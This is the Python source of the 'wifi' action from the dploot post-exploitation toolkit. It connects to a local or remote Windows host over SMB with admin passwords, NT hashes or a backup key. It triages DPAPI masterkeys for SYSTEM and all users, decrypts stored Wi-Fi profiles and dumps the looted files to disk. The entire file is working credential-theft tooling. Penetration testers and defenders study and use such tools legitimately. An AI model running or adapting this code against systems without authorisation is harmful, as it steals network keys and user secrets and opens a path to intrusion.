import argparse
import logging
import sys
from typing import Callable, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk, handle_outputdir_option
from dploot.action.masterkeys import parse_masterkeys_options
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.wifi import WifiTriage


NAME = "wifi"


class WifiAction:
    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options

        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self.masterkeys = None
        self.outputdir = None

        self.outputdir = handle_outputdir_option(directory=self.options.export_dir)

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(
            self.options, self.target
        )

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info(
            "Connected to {} as {}\\{} {}\n".format(
                self.target.address,
                self.target.domain,
                self.target.username,
                ("(admin)" if self.is_admin else ""),
            )
        )
        if self.is_admin:
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = masterkeytriage.triage_system_masterkeys()
                # we need user masterkeys, too.
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys.extend(masterkeytriage.triage_masterkeys())
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def profile_callback(profile):
                if self.options.quiet:
                    profile.dump_quiet()
                else:
                    profile.dump()

            wifi_triage = WifiTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_profile_callback=profile_callback,
            )
            logging.info("Triage ALL WIFI profiles\n")
            wifi_triage.triage_wifi()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, wifi_triage.looted_files)

        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin


def entry(options: argparse.Namespace) -> None:
    a = WifiAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump wifi profiles from local or remote target"
    )

    group = subparser.add_argument_group("wifi options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    group.add_argument(
        "-outputfile",
        action="store",
        help=("Export keys to file"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
